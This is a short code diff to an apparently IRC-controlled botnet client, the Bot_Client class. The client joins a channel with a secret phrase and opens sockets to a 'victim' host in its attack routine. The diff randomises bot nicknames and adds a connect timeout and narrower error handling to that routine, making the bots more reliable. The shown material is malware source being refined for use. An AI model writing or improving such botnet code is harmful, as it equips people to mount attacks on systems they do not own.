@@ -14,7 +14,7 @@ class Bot_Client:
         self.port = port
         self.channel = "#" + channel
         self.secret_phrase = secret_phrase
-        self.bot_counter = 1
+        self.bot_counter = random.randint(1,100)
         #TODO figure out a way to assign unique usernames to bots
         self.bot_nick = "robotnik" + str(self.bot_counter)
         self.irc_socket = None
@@ -183,11 +183,13 @@ class Bot_Client:
         attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         connected = True
+        attack_socket.settimeout(1)
         try:
             attack_socket.connect((host, port)) # connect to victim
-        except Exception:
+        except socket.error:
             connected = False
-
+        attack_socket.settimeout(None)
+        
         if not connected:
             self.log("Error: Attack on Host: " + host + \
                      " on Port: " + str(port) + " failed.")
